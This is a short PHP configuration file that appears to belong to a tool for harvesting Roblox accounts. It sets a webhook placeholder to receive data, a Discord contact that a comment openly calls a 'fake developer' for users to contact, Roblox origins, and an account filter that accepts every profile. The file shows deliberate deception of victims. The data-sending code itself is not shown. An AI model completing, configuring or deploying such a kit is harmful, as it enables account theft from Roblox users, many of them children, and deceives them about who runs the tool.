<?php
    // webhook link
    $webhook = "Yourwebhook";
    // fake developer for the bot the users may contact
    $discord_contact = "vxlse#0001";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>